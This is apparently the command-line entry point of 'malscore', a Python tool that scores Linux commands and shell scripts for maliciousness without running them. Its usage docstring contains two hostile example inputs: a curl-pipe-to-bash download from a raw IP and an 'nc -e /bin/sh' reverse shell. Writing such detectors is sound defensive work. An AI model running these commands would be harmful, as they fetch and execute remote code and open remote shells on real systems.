#!/usr/bin/env python3
"""malscore -- score the maliciousness of a Linux command or shell script.

    malscore "curl -s http://1.2.3.4/x.sh | bash"     # score one command
    malscore -f deploy.sh                              # score a whole script
    echo "nc -e /bin/sh 10.0.0.1 4444" | malscore -    # read from stdin
    malscore --batch events.jsonl                      # score a JSONL feed
    malscore -f suspicious.sh --json                   # machine-readable output

A score of 0-100 with a verdict band (benign / low / medium / high / critical)
is produced from named, MITRE-mapped signals.  Nothing is ever executed: the
tool only ever reads the command text.  See the cmdfeat README for how scores
are built and why they are evidence, not proof.
"""

from __future__ import annotations

import argparse
import json
import os
import sys
from typing import List, Optional, Sequence

from .events import read_events
from .scoring import Analyzer
from .scoring.engine import Assessment

VERDICT_ORDER = ["benign", "low", "medium", "high", "critical"]
VERDICT_COLOR = {
    "benign": "32", "low": "36", "medium": "33", "high": "35", "critical": "31",
}
BAR_WIDTH = 24


def _supports_color(stream) -> bool:
    return hasattr(stream, "isatty") and stream.isatty() and os.environ.get("NO_COLOR") is None


def _paint(text: str, code: str, enabled: bool) -> str:
    return "\033[%sm%s\033[0m" % (code, text) if enabled else text


def _bar(score: int, enabled: bool, verdict: str) -> str:
    filled = int(round(score / 100 * BAR_WIDTH))
    bar = "█" * filled + "░" * (BAR_WIDTH - filled)
    return _paint(bar, VERDICT_COLOR.get(verdict, "0"), enabled)


def _mitre_url(technique: str) -> str:
    base, _, sub = technique.partition(".")
    tail = "%s/%s" % (base, sub) if sub else base
    return "https://attack.mitre.org/techniques/%s/" % tail


def render_text(assessment: Assessment, color: bool, explain: bool, title: str = "") -> str:
    lines: List[str] = []
    verdict = assessment.verdict
    head = "%s  score %3d/100  %s" % (
        _bar(assessment.score, color, verdict),
        assessment.score,
        _paint(verdict.upper(), VERDICT_COLOR.get(verdict, "0") + ";1", color),
    )
    lines.append(head)
    if title:
        lines.append("  " + title)
    if assessment.tactics:
        lines.append("  tactics: " + ", ".join(assessment.tactics))

    if assessment.per_statement:
        flagged = [s for s in assessment.per_statement if s.hits]
        lines.append("")
        lines.append("  %d statement(s), %d flagged:" % (len(assessment.per_statement), len(flagged)))
        for statement in flagged:
            lines.append("    %s L%-4d %3d %-8s %s" % (
                _bar(statement.score, color, statement.verdict).ljust(0),
                statement.line, statement.score, statement.verdict,
                _truncate(statement.command, 60)))

    if explain and assessment.hits:
        lines.append("")
        lines.append("  evidence:")
        for hit in assessment.hits:
            techniques = " ".join(hit.techniques)
            lines.append("    [%0.2f] %-28s %s" % (hit.weight, hit.tactic, hit.title))
            if techniques:
                lines.append("           %s" % techniques)
    elif assessment.hits:
        lines.append("  signals: " + ", ".join(h.id for h in assessment.hits[:6])
                     + (" ..." if len(assessment.hits) > 6 else ""))
    return "\n".join(lines)


def _truncate(text: str, width: int) -> str:
    text = text.replace("\n", " ")
    return text if len(text) <= width else text[: width - 1] + "…"


def _read_input(args: argparse.Namespace) -> Optional[str]:
    if args.file:
        with open(args.file, "r", encoding="utf-8", errors="replace") as handle:
            return handle.read()
    if args.command == ["-"] or (not args.command and not sys.stdin.isatty()):
        return sys.stdin.read()
    if args.command:
        return " ".join(args.command)
    return None


def _score_batch(analyzer: Analyzer, path: str, args: argparse.Namespace, color: bool) -> int:
    """Score each event in a JSONL/array feed; return worst verdict rank."""
    events = read_events(path, strict=False)
    threshold = VERDICT_ORDER.index(args.min_verdict) if args.min_verdict else 0
    worst = 0
    shown = 0
    out = sys.stdout
    for event in events:
        assessment = analyzer.assess_command(event.command or "", line=event.line_number)
        rank = VERDICT_ORDER.index(assessment.verdict)
        worst = max(worst, rank)
        if rank < threshold:
            continue
        shown += 1
        if args.json:
            record = assessment.as_dict(include_statements=False)
            record["line_number"] = event.line_number
            if event.user:
                record["user"] = event.user
            if event.timestamp:
                record["timestamp"] = event.timestamp.isoformat()
            out.write(json.dumps(record) + "\n")
        else:
            out.write("%s %3d %-8s %s\n" % (
                _bar(assessment.score, color, assessment.verdict),
                assessment.score, assessment.verdict,
                _truncate(event.command or "", 70)))
    if not args.json:
        sys.stderr.write("scored feed; %d event(s) at or above '%s'\n"
                         % (shown, args.min_verdict or "benign"))
    return worst


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="malscore",
        description="Score the maliciousness of a Linux command or shell script (0-100).",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="The tool never executes what it analyses; it only reads the text.",
    )
    parser.add_argument("command", nargs="*", help="command to score, or '-' to read stdin")
    parser.add_argument("-f", "--file", help="score a shell script file")
    parser.add_argument("--batch", help="score every command in a JSONL/array event feed")
    parser.add_argument("-c", "--command-mode", action="store_true",
                        help="treat input as a single command even if it spans lines")
    parser.add_argument("-j", "--json", action="store_true", help="emit JSON instead of text")
    parser.add_argument("-e", "--explain", action="store_true",
                        help="list every signal with its weight and MITRE techniques")
    parser.add_argument("--redact", action="store_true",
                        help="redact credential-looking values before echoing any command text")
    parser.add_argument("--min-verdict", choices=VERDICT_ORDER,
                        help="in --batch, only print events at or above this verdict")
    parser.add_argument("--fail-on", choices=VERDICT_ORDER,
                        help="exit non-zero if the verdict is at or above this band")
    parser.add_argument("--no-color", action="store_true", help="disable ANSI colour")
    return parser


def main(argv: Sequence[str] = None) -> int:
    args = build_parser().parse_args(argv)
    color = not args.no_color and not args.json and _supports_color(sys.stdout)
    analyzer = Analyzer(redact=args.redact)

    if args.batch:
        worst = _score_batch(analyzer, args.batch, args, color)
        if args.fail_on:
            return 2 if worst >= VERDICT_ORDER.index(args.fail_on) else 0
        return 0

    text = _read_input(args)
    if text is None or not text.strip():
        build_parser().error("provide a command, -f FILE, --batch FILE, or pipe via stdin")

    if args.command_mode:
        assessment = analyzer.assess_command(text.strip())
    else:
        assessment = analyzer.assess(text)

    if args.json:
        print(json.dumps(assessment.as_dict(), indent=2))
    else:
        title = os.path.basename(args.file) if args.file else ""
        print(render_text(assessment, color, args.explain, title=title))

    if args.fail_on and VERDICT_ORDER.index(assessment.verdict) >= VERDICT_ORDER.index(args.fail_on):
        return 2
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
